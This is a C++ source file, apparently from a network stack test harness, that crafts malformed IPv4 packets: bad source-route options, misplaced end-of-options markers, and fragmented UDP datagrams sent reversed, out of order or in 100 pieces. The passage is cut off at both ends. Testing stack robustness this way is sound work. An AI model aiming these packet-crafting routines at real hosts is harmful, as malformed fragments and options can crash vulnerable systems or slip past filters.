		pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
		pIPPacket->IPHeader.SetProtocolType(IPPROTOCOL_UDP);
		pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
		pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
		
		pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
		pIPPacket->IPHeader.SetDatagramLength(IPHEADER_DEFAULT + 4);

		pIPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
		pIPPacket->IPHeader.SetHdrLength(IPHEADER_DEFAULT + 4);

		pIPOption = pIPPacket->IPHeader.CreateIPOption(IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE);
		pIPOption->SetOptionBufferLength(sizeof(DWORD));
		pIPOption->SetOptionLength(11);
		pIPOption->SetOptionOffset(8);

		pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
		
		pInterface->Send(*pIPPacket);
	}
	catch(CSpartaException *Ex)
	{
		delete Ex;
		fSuccess = FALSE;
	}

	pIPPacket ? delete pIPPacket : 0;

	return fSuccess;
}

//==================================================================================
// IPOptionsExactSizeAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with a variable-length option reaching the exact end of the header
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsExactSizeAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPOption *pIPOption = NULL;
	CHAR szFormattedDestMac[18], PayloadData[1];
	CHAR *pBuffer = NULL;
	BOOL fSuccess = TRUE;

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Watch for SPARTA exceptions
	try
	{
		// Create a destination mac address from the address reported by the client
		MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
		
		// Create the packet
		pUDPPacket = new CUDPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pUDPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
		pUDPPacket->MacHeader.SetProtocolType(0x800);
		pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
		pUDPPacket->IPHeader.SetTOS(IPTOS_DEFAULT);
		pUDPPacket->IPHeader.SetID(IPID_DEFAULT);
		pUDPPacket->IPHeader.SetFlag(0);
		pUDPPacket->IPHeader.SetFragOffset(0);
		pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
		pUDPPacket->IPHeader.SetProtocolType(IPPROTOCOL_UDP);
		pUDPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
		pUDPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
		
		pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
		pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_DEFAULT + 8 + UDPHEADER_SIZE + 1);

		pUDPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
		pUDPPacket->IPHeader.SetHdrLength(IPHEADER_DEFAULT + 8);

		pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_NO_OPERATION);
		pIPOption = pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE);
		pIPOption->SetOptionBufferLength(3 + sizeof(DWORD));
		pIPOption->SetOptionLength(3 + sizeof(DWORD));
		pIPOption->SetOptionOffset(4);
		pIPOption->SetIPAddrAt(4, IPADDR_SOURCE);

		pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);
		
		pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
		pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
		pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
		pUDPPacket->UDPHeader.SetLength(9);
		pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
		pUDPPacket->UDPHeader.SetChecksum(0);

		PayloadData[0] = 'x';
		pUDPPacket->SetUserBuffer(PayloadData, 1, TRUE);

		pInterface->Send(*pUDPPacket);
	}
	catch(CSpartaException *Ex)
	{
		delete Ex;
		fSuccess = FALSE;
	}

	pUDPPacket ? delete pUDPPacket : 0;

	return fSuccess;
}

//==================================================================================
// IPOptionsEndOfOpsLastAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with a variable-length option followed by an end-of-options
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsEndOfOpsLastAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPOption *pIPOption = NULL;
	CHAR szFormattedDestMac[18], PayloadData[1];
	CHAR *pBuffer = NULL;
	BOOL fSuccess = TRUE;

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Watch for SPARTA exceptions
	try
	{
		// Create a destination mac address from the address reported by the client
		MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
		
		// Create the packet
		pUDPPacket = new CUDPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pUDPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
		pUDPPacket->MacHeader.SetProtocolType(0x800);
		pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
		pUDPPacket->IPHeader.SetTOS(IPTOS_DEFAULT);
		pUDPPacket->IPHeader.SetID(IPID_DEFAULT);
		pUDPPacket->IPHeader.SetFlag(0);
		pUDPPacket->IPHeader.SetFragOffset(0);
		pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
		pUDPPacket->IPHeader.SetProtocolType(IPPROTOCOL_UDP);
		pUDPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
		pUDPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
		
		pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
		pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_DEFAULT + 8 + UDPHEADER_SIZE + 1);

		pUDPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
		pUDPPacket->IPHeader.SetHdrLength(IPHEADER_DEFAULT + 8);

		pIPOption = pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE);
		pIPOption->SetOptionBufferLength(3 + sizeof(DWORD));
		pIPOption->SetOptionLength(3 + sizeof(DWORD));
		pIPOption->SetOptionOffset(4);
		pIPOption->SetIPAddrAt(4, IPADDR_SOURCE);
		pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_END_OF_OPTIONLIST);

		pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);
		
		pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
		pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
		pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
		pUDPPacket->UDPHeader.SetLength(9);
		pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
		pUDPPacket->UDPHeader.SetChecksum(0);
		
		PayloadData[0] = 'x';
		pUDPPacket->SetUserBuffer(PayloadData, 1, TRUE);

		pInterface->Send(*pUDPPacket);
	}
	catch(CSpartaException *Ex)
	{
		delete Ex;
		fSuccess = FALSE;
	}

	pUDPPacket ? delete pUDPPacket : 0;

	return fSuccess;
}

//==================================================================================
// IPOptionsEndOfOpsFirstAttack
//----------------------------------------------------------------------------------
//
// Description: Server sends datagram with an end-of-options followed by a variable-length option
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsEndOfOpsFirstAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPOption *pIPOption = NULL;
	CHAR szFormattedDestMac[18], PayloadData[1];
	CHAR *pBuffer = NULL;
	BOOL fSuccess = TRUE;

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Watch for SPARTA exceptions
	try
	{
		// Create a destination mac address from the address reported by the client
		MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
		CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
		
		// Create the packet
		pUDPPacket = new CUDPPacket(MediaType);
		
		// Fill in the IP information from the input parameters
		pUDPPacket->MacHeader.SetDestAddress(ClientMacAddr);
		pUDPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
		pUDPPacket->MacHeader.SetProtocolType(0x800);
		pUDPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
		pUDPPacket->IPHeader.SetTOS(IPTOS_DEFAULT);
		pUDPPacket->IPHeader.SetID(IPID_DEFAULT);
		pUDPPacket->IPHeader.SetFlag(0);
		pUDPPacket->IPHeader.SetFragOffset(0);
		pUDPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
		pUDPPacket->IPHeader.SetProtocolType(IPPROTOCOL_UDP);
		pUDPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
		pUDPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
		
		pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
		pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_DEFAULT + 8 + UDPHEADER_SIZE);

		pUDPPacket->IPHeader.SetAutoCalcHeaderLength(OFF);
		pUDPPacket->IPHeader.SetHdrLength(IPHEADER_DEFAULT + 8);

		pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_END_OF_OPTIONLIST);
		pIPOption = pUDPPacket->IPHeader.CreateIPOption(IP_OPTIONS_STRICT_SOURCE_RECORD_ROUTE);
		pIPOption->SetOptionBufferLength(3 + sizeof(DWORD));
		pIPOption->SetOptionLength(3 + sizeof(DWORD));
		pIPOption->SetOptionOffset(4);
		pIPOption->SetIPAddrAt(4, IPADDR_SOURCE);

		pUDPPacket->IPHeader.SetAutoCalcChecksum(ON);
		
		pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
		pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
		pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
		pUDPPacket->UDPHeader.SetLength(9);
		pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
		pUDPPacket->UDPHeader.SetChecksum(0);
		
		PayloadData[0] = 'x';
		pUDPPacket->SetUserBuffer(PayloadData, 1, TRUE);

		pInterface->Send(*pUDPPacket);
	}
	catch(CSpartaException *Ex)
	{
		delete Ex;
		fSuccess = FALSE;
	}

	pUDPPacket ? delete pUDPPacket : 0;

	return fSuccess;
}

//==================================================================================
// IPFragFullReverseAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 4-part fragmented datagram in reverse order
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragFullReverseAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = (DEFAULT_FRAG_COUNT - 1); i >= 0; --i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag((i == (DEFAULT_FRAG_COUNT - 1)) ? 0 : IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset( i * 2);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int)'a' +  (int) i, sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);

			if(i == 0)
			{
				CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMidReverseAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 4-part fragmented datagram where the
// middle two fragments are in reverse order
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMidReverseAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < DEFAULT_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			pIPPacket->IPHeader.SetFlag((i == DEFAULT_FRAG_COUNT - 1) ? 0 : IPFLAG_MOREFRAGS);

			// Based on which packet we are sending set the payload data and the fragment offset
			switch(i)
			{
				CUDPPacket *pUDPPacket;
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFragOffset(0);
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				break;
			case 1:
				pIPPacket->IPHeader.SetFragOffset(2 * 2);
				memset(PayloadBuffer, (int)'c', sizeof(PayloadBuffer));
				break;
			case 2:
				pIPPacket->IPHeader.SetFragOffset(1 * 2);
				memset(PayloadBuffer, (int)'b', sizeof(PayloadBuffer));
				break;
			default:
				pIPPacket->IPHeader.SetFragOffset(3 * 2);
				memset(PayloadBuffer, (int)'d', sizeof(PayloadBuffer));
				break;
			}
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);

			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);
			
			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragLastInSecondAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 4-part fragmented datagram where the
// the last fragment arrives second
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragLastInSecondAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < DEFAULT_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);


			// Based on which packet we are sending set the payload data and the fragment offset
			switch(i)
			{
				CUDPPacket *pUDPPacket;
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFragOffset(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				break;
			case 1:
				pIPPacket->IPHeader.SetFragOffset(3 * 2);
				pIPPacket->IPHeader.SetFlag(0);
				memset(PayloadBuffer, (int)'d', sizeof(PayloadBuffer));
				break;
			case 2:
				pIPPacket->IPHeader.SetFragOffset(1 * 2);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				memset(PayloadBuffer, (int)'b', sizeof(PayloadBuffer));
				break;
			default:
				pIPPacket->IPHeader.SetFragOffset(2 * 2);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				memset(PayloadBuffer, (int)'c', sizeof(PayloadBuffer));
				break;
			}
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);

			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);
			
			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMixedSizeAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 4-part fragmented datagram where the fragments
// are of varying sizes.
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMixedSizeAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[32];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < DEFAULT_FRAG_COUNT; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);

			// Based on which packet we are sending set the payload data and the fragment offset
			switch(i)
			{
				CUDPPacket *pUDPPacket;
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(72);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFragOffset(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 24);
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 24, TRUE);
				break;
			case 1:
				pIPPacket->IPHeader.SetFragOffset(4);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'b', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			case 2:
				pIPPacket->IPHeader.SetFragOffset(6);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'c', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFragOffset(7);
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'d', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			}
						
			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragOneHundredAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 100-part fragmented datagram
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOneHundredAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 100; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag((i == 99) ? 0 : IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset(i * 2);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
